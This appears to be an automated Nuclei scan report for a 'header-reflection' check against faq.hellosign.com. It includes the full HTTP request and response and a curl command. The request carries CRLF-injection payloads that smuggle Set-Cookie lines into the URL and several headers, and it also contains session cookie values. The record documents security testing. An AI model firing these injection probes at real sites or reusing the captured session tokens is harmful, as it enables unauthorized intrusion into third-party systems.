### Looking for reflected values from request headers (header-reflection) found on https://faq.hellosign.com

----
**Details**: **header-reflection** matched at https://faq.hellosign.com

**Protocol**: HTTP

**Full URL**: https://faq.hellosign.com/%0d%0aset-cookie%20%3amycookie%3dCanary12345;%20%44omain%20%3d.faq.hellosign.com

**Timestamp**: Sat Dec 9 14:38:42 +0000 UTC 2023

**Template Information**

| Key | Value |
| --- | --- |
| Name | Looking for reflected values from request headers |
| Authors | panch0r3d |
| Tags |  |
| Severity | high |

**Request**
```http
GET /%0d%0aset-cookie%20%3amycookie%3dCanary12345;%20%44omain%20%3d.faq.hellosign.com HTTP/1.1
Host: faq.hellosign.com
User-Agent: Mozilla Canary12345%0d%0ASet-Cookie: CanaryCookie=12345UA; path=/; secure; httponly
Connection: close
Accept: */*
Accept-Language: en
Cookie: Canary12345=qwerty%0d%0ASet-Cookie: CanaryCookie=12345CK; path=/; secure; httponly; _help_center_session=VlZvaDZ3ZFVqN1RITkhCQmlzamh5cm1MU1BQYzFnd3ZTQThkYnZJN0FKY2RjNEo1c1A0eHQrSjNMcUFSaERFOGNSUjduQkZiV2doOC93bVRDMU5kOEVnZ05PUnBuZERLS3VUTVR6SENBRnFlck9Fdks3Vk5VdWxEZldxdmdoMXYtLTJkODNTbVU3Y0RuelZoMEMybGNpMlE9PQ%3D%3D--ea390aefeec8a28bbc98ad793d3ecc1e7f84f330; __cfruid=c849c7bec663076e4b169fbd5d57fea5a4c9b12e-1702132716
Origin: Canary123456.com%0d%0ASet-Cookie: CanaryCookie=12345XR; path=/; secure; httponly
Referer: google.com%0d%0ASet-Cookie: CanaryCookie=12345R; path=/; secure; httponly
X-Forwarded-For: 0.0.0.0%0d%0ASet-Cookie: CanaryCookie=12345XF; path=/; secure; httponly
x-request-id: 123456%0d%0ASet-Cookie: CanaryCookie=12345XR; path=/; secure; httponly
Accept-Encoding: gzip


```

**Response**
```http
HTTP/1.1 404 Not Found
Connection: close
Transfer-Encoding: chunked
Cache-Control: no-cache
Cache-Control: no-cache
Cf-Cache-Status: DYNAMIC
Cf-Ray: 832dfe49dbd62a7d-CDG
Content-Language: en-gb
Content-Type: text/html; charset=utf-8
Date: Sat, 09 Dec 2023 14:38:42 GMT
Nel: {"success_fraction":0.01,"report_to":"cf-nel","max_age":604800}
Report-To: {"endpoints":[{"url":"https:\/\/a.nel.cloudflare.com\/report\/v3?s=sozoYGyRg9ruKuJQOcBCu0pjnVDXXX4qfo8Mll4sQGZgh9ROrkHFAsoo1nt8jJqt1s5pqkxD36zQ%2BoMSt2F3koVqI7l6wzr9492wobJ0ZFzyLDEpe0icmZW0Xu5ghrW%2FQ4z8"}],"group":"cf-nel","max_age":604800}
Server: cloudflare
Set-Cookie: _zendesk_authenticated=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT; secure; HttpOnly; SameSite=None
Set-Cookie: _zendesk_session=I%2FWTxvcNFdlH39OP4pZ1kf7aOgOlIZo3%2Bq8utWUDHZuQ8fmqKvIogAiFCx9f50CHbS0%2FOVkpO1jot2ccmmESh6BW5gUWsXewwyIPElAGuNdNawvu5IljBJkaUVvXi2UCI%2F0GDRiPjbpb4I7ohF6O1QZhbWl%2BcK%2FOnrZugehwtId74E1jEaz%2BN9UMFnLMO9dSzHhDx9x%2BqFdNuon57%2FQTEh9lfbJdMOOfR9oPVSKHuco%3D--7z%2BKDqyGpHnlHk0O--95AxUgJKb7zCIIohXy2w%2FQ%3D%3D; path=/; secure; HttpOnly; SameSite=None
Set-Cookie: _help_center_session=U3ZvcGg4NmU4NkxRdmIvaFdMWXJXRjNKcHZaRmJ0YU5HU080VXYwT0RCRFFmcm5YM3dXdnl6TVR6enRBbXAvZWpNNFRNempQd0h2aWwwT1NKQ092YWpGVXZLanRnWVUrTEd5Szl5RU9QN1NHdjI3MXhKRXU4RHdSWjROb1J2V2QtLVVrQ0k3cnVPM09PTWJhNkVDTE8vdFE9PQ%3D%3D--7a7885ea752d44180e5365496c9011068fc4f50d; path=/; secure; HttpOnly; SameSite=None
Strict-Transport-Security: max-age=259200;
Vary: Accept
X-Frame-Options: SAMEORIGIN
X-Request-Id: 1234560d0ASet-CookieCanaryCookie12345XRpathsecurehttponly
X-Runtime: 0.141443
X-Ua-Compatible: IE=edge
X-Xss-Protection: 1; mode=block
X-Zendesk-Origin-Server: app-server-797bbd99bf-6r9pw
X-Zendesk-Processed-Host-Header: faq.hellosign.com

<!DOCTYPE html>
<html dir="ltr" lang="en-GB">
<head>
  <meta charset="utf-8" />
  <!-- v23896 -->


  <title>The page you were looking for doesn't exist &ndash; Help Center</title>

  <meta name="csrf-param" content="authenticity_token">
<meta name="csrf-token" content="">

  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">

  <link rel="stylesheet" href="//static.zdassets.com/hc/assets/application-1dcff57f34179d82a4935f28e3666e12.css" media="all" id="stylesheet" />
    <!-- Entypo pictograms by Daniel Bruce — www.entypo.com -->
    <link rel="stylesheet" href="//static.zdassets.com/hc/assets/theming_v1_support-e05586b61178dcde2a13a3d323525a18.css" media="all" />
  <link rel="stylesheet" type="text/css" href="//p13.zdassets.com/hc/theming_assets/696999/154078/style.css?digest=14021817488653">

  <link rel="icon" type="image/x-icon" href="//theme.zdassets.com/theme_assets/696999/74c3f235d64d9af1f4fed9dc477499611bb2050c.png" />

    <script src="//static.zdassets.com/hc/assets/jquery-09d07e20ce042ef10e301661ad1f316c.js"></script>
    
    

  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
  <script type="text/javascript" src="//p13.zdassets.com/hc/theming_assets/696999/154078/script.js?digest=14021817488653"></script>
</head>
<body class="">
  
  

  <header class="header">
  <div class="logo">
    <a title="Home" href="/hc">
      <img src="//theme.zdassets.com/theme_assets/696999/854e5a3534a6ab1a29a34e2a4ee86291b4e7641f.png" alt="Logo">
    </a>
  </div>
  <div class="nav-wrapper">
    <span class="icon-menu"></span>
    <nav class="user-nav" id="user-nav">
      <a class="submit-a-request" href="/hc/requests/new">Submit a request</a>
    </nav>
  </div>
</header>


  <main role="main">
    <div class="container-divider"></div>
<div class="error-page">
  <h1>oops</h1>

  

  

  
    <h2>The page you were looking for doesn't exist</h2>
    <p>You may have mistyped the address or the page may have moved</p>
  

  <a title="Home" href="/hc">
    Take me back to the home page
  </a>
</div>

  </main>

  <footer class="footer">
  <script type="text/javascript">
    (function pithos() {
      function updateConsent(args){
        global.window.dataLayer.push('consent', 'update', args);
      }
      
      function GTM (w, d, s, l) {
        if (/bot|googlebot|crawler|spider|robot|crawling|frog|lighthouse/i.test(global.navigator.userAgent)) {
          return;
        }
        const i = d.getElementsByName('gtm_id')[0].content;
        w[l] = w[l] || [];
        w[l].push({ 'gtm.start': new Date().getTime(), 'event': 'gtm.js' });
        w[l].push('consent', 'default', {
          'ad_storage': 'denied',
          'analytics_storage': 'denied',
          'performance': 'denied',
          'social_media': 'denied'
        });
        const f = d.getElementsByTagName(s)[0];
        let j = d.createElement(s);
        let dl = l != 'dataLayer' ? `&l=${l}` : '';
        j.async = true;
        j.src = `https://www.googletagmanager.com/gtm.js?id=${i}${dl}`;
        f.parentNode.insertBefore(j, f);
      }

      function tealium() {
        const uri = 'https://tags.tiqcdn.com/utag/dropbox/hellosign/prod/utag.js';
        const script = document.createElement('script');
        script.s.... Truncated ....
```

**Extra Information**

**Extracted results:**

- X-Request-Id: 1234560d0ASet-CookieCanaryCookie12345XRpathsecurehttponly



**CURL command**
```sh
curl -X 'GET' -H 'Accept: */*' -H 'Accept-Language: en' -H 'Cookie: Canary12345=qwerty%0d%0ASet-Cookie: CanaryCookie=12345CK; path=/; secure; httponly; _help_center_session=VlZvaDZ3ZFVqN1RITkhCQmlzamh5cm1MU1BQYzFnd3ZTQThkYnZJN0FKY2RjNEo1c1A0eHQrSjNMcUFSaERFOGNSUjduQkZiV2doOC93bVRDMU5kOEVnZ05PUnBuZERLS3VUTVR6SENBRnFlck9Fdks3Vk5VdWxEZldxdmdoMXYtLTJkODNTbVU3Y0RuelZoMEMybGNpMlE9PQ%3D%3D--ea390aefeec8a28bbc98ad793d3ecc1e7f84f330; __cfruid=c849c7bec663076e4b169fbd5d57fea5a4c9b12e-1702132716' -H 'Origin: Canary123456.com%0d%0ASet-Cookie: CanaryCookie=12345XR; path=/; secure; httponly' -H 'Referer: google.com%0d%0ASet-Cookie: CanaryCookie=12345R; path=/; secure; httponly' -H 'User-Agent: Mozilla Canary12345%0d%0ASet-Cookie: CanaryCookie=12345UA; path=/; secure; httponly' -H 'X-Forwarded-For: 0.0.0.0%0d%0ASet-Cookie: CanaryCookie=12345XF; path=/; secure; httponly' -H 'x-request-id: 123456%0d%0ASet-Cookie: CanaryCookie=12345XR; path=/; secure; httponly' 'https://faq.hellosign.com/%0d%0aset-cookie%20%3amycookie%3dCanary12345;%20%44omain%20%3d.faq.hellosign.com'
```

----

Generated by [Nuclei v3.1.0-dev](https://github.com/projectdiscovery/nuclei)